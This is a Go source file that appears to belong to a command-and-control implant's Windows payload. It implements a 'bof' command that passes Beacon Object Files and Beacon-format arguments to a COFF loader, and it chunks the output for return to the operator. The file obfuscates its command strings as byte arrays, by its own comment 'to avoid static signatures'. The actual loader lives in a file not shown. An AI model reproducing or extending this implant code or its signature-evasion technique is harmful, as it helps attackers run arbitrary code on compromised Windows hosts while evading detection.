// server/docker/payloads/Windows/action_bof.go
//go:build windows
// +build windows

package main

import (
	"runtime"
	"strings"
	"time"
)

// BOF strings (constructed to avoid static signatures)
var (
	bofCmdName   = string([]byte{0x62, 0x6f, 0x66})                               // bof
	bofOSWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})       // windows
)

// BOFCommand handles BOF execution
type BOFCommand struct{}

func (c *BOFCommand) Name() string {
	return bofCmdName
}

func (c *BOFCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// For Windows only - BOF is Windows-specific
	if runtime.GOOS != bofOSWindows {
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	// This will be handled by the command queue's processBOF method
	// The actual execution happens there with the full Command data
	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// splitIntoChunks splits a string into chunks of specified maximum size
// This is used by both regular BOF and BOF async for chunking large outputs
func splitIntoChunks(s string, maxSize int) []string {
	if len(s) <= maxSize {
		return []string{s}
	}

	var chunks []string
	for len(s) > 0 {
		chunkSize := maxSize
		if chunkSize > len(s) {
			chunkSize = len(s)
		}

		// Try to split at a newline if possible
		chunk := s[:chunkSize]
		if chunkSize < len(s) {
			if idx := strings.LastIndex(chunk, "\n"); idx > 0 && idx > chunkSize/2 {
				chunkSize = idx + 1
				chunk = s[:chunkSize]
			}
		}

		chunks = append(chunks, chunk)
		s = s[chunkSize:]
	}

	return chunks
}

// parseBOFArguments parses BOF arguments in the Beacon format
// Format: bXXXX for binary, iXXX for int, sXX for short, zXXX for string, ZXXX for wide string
func parseBOFArguments(argString string) ([]byte, error) {
	args := strings.Fields(argString)
	if len(args) == 0 {
		return nil, nil
	}

	// On Windows, this will use the lighthouse package's PackArgs function
	// On non-Windows, it returns empty args
	return parseBOFArgumentsPlatform(args)
}

// executeBOF is the platform-specific BOF execution function
// This will be implemented differently for Windows
func executeBOF(bofBytes []byte, args []byte) (string, error) {
	if runtime.GOOS != bofOSWindows {
		return "", nil
	}

	// The actual Windows implementation would go here
	// This would use the coff loader from the provided code
	// On Windows, this calls executeBOFPlatform from action_bof_windows.go
	return executeBOFPlatform(bofBytes, args)
}
